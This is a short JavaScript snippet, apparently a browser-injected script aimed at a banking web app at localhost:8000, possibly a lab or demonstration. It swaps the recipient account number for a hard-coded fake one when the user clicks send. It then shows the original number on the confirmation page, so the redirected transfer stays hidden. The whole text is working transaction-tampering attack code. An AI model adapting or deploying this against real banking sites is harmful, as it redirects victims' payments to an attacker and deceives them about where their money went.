let fakeAccountNumber = '99999999999999999999999999';

localStorage.setItem('fakeAccountNumber', fakeAccountNumber);

if (window.location.href == 'http://localhost:8000/transfer/confirm/') {
    document.getElementById("sendTransferButton").addEventListener("click", function() {
        localStorage.setItem('realAccountNumber', document.getElementById('id_recipientAccount').value);
        document.getElementById('id_recipientAccount').value = localStorage.getItem('fakeAccountNumber');
    });
}

if (window.location.href == 'http://localhost:8000/transfer/info/') {
    document.getElementById('recipientAccount').innerText = localStorage.getItem('realAccountNumber');
}
